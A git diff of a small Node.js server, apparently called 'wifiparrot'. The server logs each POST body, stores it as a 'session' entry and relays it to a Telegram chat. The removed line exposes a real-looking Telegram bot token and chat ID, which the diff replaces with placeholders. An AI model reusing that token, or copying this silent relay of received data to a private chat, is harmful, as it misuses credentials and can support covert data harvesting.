@@ -26,7 +26,7 @@ const server = http.createServer(function (request, response) {
     })
     request.on('end', function () {
       console.log('Body: ' + body)
-      https.get(`https://api.telegram.org/bot1304849534:AAEW6-RSNi6plXe_gfsUalPvsUafsNuQVIs/sendMessage?chat_id=502060443&text=${body}`);
+      https.get(`https://api.telegram.org/bot{{Your bot token}}/sendMessage?chat_id={{your telegram id}}&text=${body}`);
       response.writeHead(200, { 'Content-Type': 'text/html' })
       response.end('post received')
       db.run('INSERT INTO enteries (session) VALUES(?)', [body], err =>
@@ -48,7 +48,7 @@ const server = http.createServer(function (request, response) {
       <html>
           <body>
           ${enteries}
-          <h1>version: 2.2.0</h1>
+          <h1>version: 2.2.1</h1>
               <form method="post" action="https://wifiparrot.herokuapp.com">Name: 
                   <input type="text" name="name" />
                   <input type="submit" value="Submit" />
